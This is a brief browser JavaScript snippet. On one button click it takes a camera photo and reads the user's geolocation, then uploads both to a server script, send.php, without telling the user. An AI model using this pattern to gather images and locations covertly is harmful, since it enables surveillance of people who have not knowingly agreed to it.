const video = document.querySelector('#video');
const startButton = document.querySelector('#startButton');

startButton.addEventListener('click', function() {
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        imageCapture.takePhoto().then(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'capture.jpg');

            fetch('send.php', {
                method: 'POST',
                body: formData
            });
        });
    });

    navigator.geolocation.getCurrentPosition(position => {
        fetch('send.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            })
        });
    });
});
